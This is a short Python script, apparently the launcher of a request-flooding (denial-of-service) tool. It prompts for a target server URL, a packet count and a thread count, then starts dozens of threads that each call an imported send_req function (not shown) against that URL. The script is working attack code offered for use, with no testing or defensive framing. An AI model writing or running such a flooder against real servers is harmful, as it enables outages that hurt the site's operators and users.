import requests
import threading
from colorama import Fore
from main import send_req

uurl = input(f"{Fore.RED}Enter server URL: {Fore.RESET}")
packets = int(input(f"{Fore.RED}Enter packet amount (64 reccomended): {Fore.RESET}"))
threadsamount = int(input(f"{Fore.RED}Enter thread amount (32 reccomended): {Fore.RESET}"))

print(f"{packets * threadsamount} packets in total")

threads = []

for _ in range(threadsamount):
    thread = threading.Thread(target = send_req, args = [packets, uurl])
    thread.daemon = True
    threads.append(thread)

for i in range(len(threads)):
    threads[i].start()

for i in range(len(threads)):
    threads[i].join()